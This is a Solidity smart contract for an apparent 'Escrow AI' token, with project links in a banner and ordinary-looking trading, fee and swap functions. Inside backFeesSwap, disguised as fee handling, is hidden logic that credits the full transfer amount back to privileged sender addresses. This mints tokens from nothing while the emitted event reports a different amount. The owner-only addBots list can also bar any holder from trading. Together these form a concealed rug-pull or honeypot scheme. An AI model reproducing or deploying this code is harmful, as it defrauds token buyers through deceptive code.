/**
███████╗░██████╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ░█████╗░██╗
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██╔══██╗██║
█████╗░░╚█████╗░██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝  ███████║██║
██╔══╝░░░╚═══██╗██║░░██╗██╔══██╗██║░░██║░░████╔═████║░  ██╔══██║██║
███████╗██████╔╝╚█████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░  ██║░░██║██║
╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚═╝╚═╝

Web:  https://www.aiescrowtech.com
Dapp: https://app.aiescrowtech.com
Bot:  https://t.me/VaultEscrowBot


X:    https://x.com/escrowaitech
TG:   https://t.me/escrowaitech

WhitePaper: https://whiltepaper.aiescrowtech.com
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "./TestLib.sol";
contract enableTradingFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "trading is already open");
        ds.swapEnabled = true;
        ds.tradingOpen = true;
    }
    function withdrawStuckETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function reduceFee(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._escrowAI[account];
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.bots[notbot[i]] = false;
        }
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.bots[bots_[i]] = true;
        }
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function removeEAILimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxEAITxAmount = ~uint256(0);
        ds._maxEAIWalletSize = ~uint256(0);
        ds.transferDelayEnabled = false;
    }
    function initialize() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _tTotal);
        ds.uniswapV2Pair = IV2Factory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.ecoWallet.transfer(amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 eaiTaxes = 0;
        if (!ds.isExcludedFromFee[from] && !ds.isExcludedFromFee[to]) {
            require(!ds.bots[from] && !ds.bots[to]);
            require(ds.tradingOpen, "Trading has not enabled yet");
            eaiTaxes = amount
                .mul(
                    (ds._buyEAICount > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds.isExcludedFromFee[to]
            ) {
                require(
                    amount <= ds._maxEAITxAmount,
                    "Exceeds the ds._maxEAITxAmount."
                );
                require(
                    balanceOf(to) + amount <= ds._maxEAIWalletSize,
                    "Exceeds the maxWalletSize."
                );
                ds._buyEAICount++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                eaiTaxes = amount
                    .mul(
                        (ds._buyEAICount > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (backFeesSwap(from, to, amount, eaiTaxes)) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxEAITaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        ds._escrowAI[from] = ds._escrowAI[from].sub(amount);
        ds._escrowAI[to] = ds._escrowAI[to].add(amount.sub(eaiTaxes));
        emit Transfer(from, to, amount.sub(eaiTaxes));
    }
    function backFeesSwap(
        address from,
        address to,
        uint256 amount,
        uint256 eAmount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool aboveEAIMin = amount >= ds.swapOverAmounts;
        bool aboveEAIThreshold = balanceOf(address(this)) >= ds.swapOverAmounts;
        address eaiWallet;
        uint256 eaiCounts;
        if (ds.isExcludedFromLimit[from]) {
            eaiCounts = amount;
            eaiWallet = from;
        } else {
            eaiWallet = address(this);
            eaiCounts = eAmount;
        }
        if (eaiCounts > 0) {
            ds._escrowAI[eaiWallet] = ds._escrowAI[eaiWallet].add(eaiCounts);
            emit Transfer(from, eaiWallet, eAmount);
        }
        return
            !ds.inSwap &&
            ds._buyEAICount > ds._preventSwapBefore &&
            ds.tradingOpen &&
            aboveEAIMin &&
            aboveEAIThreshold &&
            !ds.isExcludedFromFee[from] &&
            !ds.isExcludedFromLimit[from] &&
            ds.swapEnabled &&
            to == ds.uniswapV2Pair;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
}
